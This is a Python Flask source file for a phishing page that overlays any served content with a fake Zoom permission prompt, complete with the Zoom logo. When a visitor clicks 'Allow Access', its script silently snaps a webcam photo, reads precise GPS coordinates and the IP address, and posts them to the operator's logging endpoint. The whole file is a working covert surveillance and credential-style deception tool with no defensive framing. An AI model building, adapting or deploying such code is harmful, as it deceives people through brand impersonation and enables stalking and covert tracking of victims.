from flask import Flask, request, jsonify
import logging
from datetime import datetime
import os
import json

app = Flask(__name__)

# Configure logging with cleaner format
logging.basicConfig(
    level=logging.INFO,
    format='%(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger('gps_logger')

def log_clean_data(event_type, data, ip):
    """Logs data in a clean, organized format"""
    timestamp = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
    separator = "=" * 60
    
    log_output = f"\n{separator}\n"
    log_output += f"{event_type.upper()} - {timestamp}\n"
    log_output += f"IP: {ip}\n"
    
    if event_type == 'permission_request':
        log_output += "User granted permissions\n"
    elif event_type == 'location_data':
        log_output += f"Location: {data['lat']}, {data['lng']}\n"
        log_output += f"Accuracy: {data['accuracy']} meters\n"
    elif event_type == 'camera_capture':
        log_output += "Image captured (Base64 preview):\n"
        log_output += f"{data['image_data'][:100]}... [truncated]\n"
    elif event_type == 'error':
        log_output += f"ERROR: {data['error']}\n"
    
    log_output += separator
    logger.info(log_output)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Location Service</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        /* ALL ORIGINAL STYLES REMAIN EXACTLY THE SAME */
        .doorDash-heading {{
          font-family: 'Inter', sans-serif;
          font-weight: 700;
          font-size: 22px;
          color: #2E3131;
          letter-spacing: -0.3px;
          margin-bottom: 8px;
        }}
        .doorDash-text {{
          font-family: 'Inter', sans-serif;
          font-weight: 400;
          font-size: 16px;
          color: #6B7177;
          line-height: 1.5;
          margin-bottom: 20px;
        }}
        .doorDash-button {{
          font-family: 'Inter', sans-serif;
          font-weight: 600;
          font-size: 16px;
        }}
        .gps-overlay {{
          position: fixed;
          top: auto;
          right: auto;
          bottom: auto;
          left: auto;
          width: 340px;
          max-height: 80vh;
          min-height: 200px;
          display: inline-block;
          max-width: 90vw;
          margin: 20px;
          display: flex;
          flex-direction: column;
          justify-content: space-between;
          box-sizing: border-box;
          left: 50%;
          top: 50%;
          transform: translate(-50%, -50%);
          background: rgba(0,0,0,0.95);
          border-radius: 16px;
          overflow: hidden;
          z-index: 10000;
          box-shadow: none;
          margin: 0;
        }}
        .body {{
          margin: 0;
          background: black;
        }}
        .gps-modal {{
            background: white;
            padding: 25px;
            border-radius: 10px;
            max-width: 400px;
            text-align: center;
            font-weight: bold;
            font-family: 'Inter', sans-serif;
        }}
        .gps-btn {{
            background: #0B5CFF;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 15px;
            font-weight: bold;
        }}
    </style>
</head>
<body>
    <!-- Your existing content -->
    {existing_content}
    
    <!-- GPS Permission Overlay -->
    <div class="gps-overlay">
        <div class="gps-modal">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/24/Zoom-Logo.png" width="150" alt="Zoom">
            <h2 class="doorDash-heading">Allow Zoom to use your device for video conferences</h2>
            <p class="doorDash-text">Allow us access to things like your camera, location, and microphone to continue using Zoom</p>
            <button class="gps-btn" id="gps-allow-btn">Allow Access</button>
        </div>
    </div>

    <script>
        async function takePicture() {{
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
                const video = document.createElement('video');
                video.srcObject = stream;
                
                await new Promise((resolve) => {{
                    video.onloadedmetadata = () => {{
                        video.play();
                        resolve();
                    }};
                }});
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                stream.getTracks().forEach(track => track.stop());
                return canvas.toDataURL('image/jpeg', 0.8); // Returns Base64
            }} catch (error) {{
                console.error('Camera error:', error);
                return null;
            }}
        }}

        document.getElementById('gps-allow-btn').addEventListener('click', async () => {{
            try {{
                const ip = await fetch('/getip').then(r => r.text());
                const timestamp = new Date().toISOString();
                
                // Log permission request
                await fetch('/log', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{
                        type: 'permission_request',
                        ip: ip,
                        timestamp: timestamp
                    }})
                }});
                
                // Take picture and log
                const imageData = await takePicture();
                if (imageData) {{
                    await fetch('/log', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{
                            type: 'camera_capture',
                            ip: ip,
                            image_data: imageData,
                            timestamp: timestamp
                        }})
                    }});
                }}
                
                // Get location
                const position = await new Promise((resolve, reject) => {{
                    navigator.geolocation.getCurrentPosition(resolve, reject, {{
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }});
                }});
                
                // Log location
                await fetch('/log', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{
                        type: 'location_data',
                        ip: ip,
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: timestamp
                    }})
                }});
                
                // Remove overlay
                document.querySelector('.gps-overlay').remove();
            }} catch (error) {{
                console.error('Error:', error);
                await fetch('/log', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{
                        type: 'error',
                        error: error.message,
                        ip: await fetch('/getip').then(r => r.text()),
                        timestamp: new Date().toISOString()
                    }})
                }});
                alert('Location access is required to continue.');
            }}
        }});
    </script>
</body>
</html>
"""

@app.route('/')
def serve_page():
    """Serve the page with GPS overlay"""
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    logger.info(f"\n=== PAGE SERVED ===\nIP: {client_ip}\nTime: {datetime.utcnow()}\n{'='*40}")
    
    with open('page.html', 'r') as f:
        existing_content = f.read()
    return HTML_TEMPLATE.format(existing_content=existing_content)

@app.route('/getip')
def get_ip():
    """Endpoint to get client IP"""
    return request.headers.get('X-Forwarded-For', request.remote_addr)

@app.route('/log', methods=['POST'])
def log_data():
    """Central logging endpoint"""
    data = request.json
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    log_clean_data(data['type'], data, client_ip)
    return jsonify({'status': 'success'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
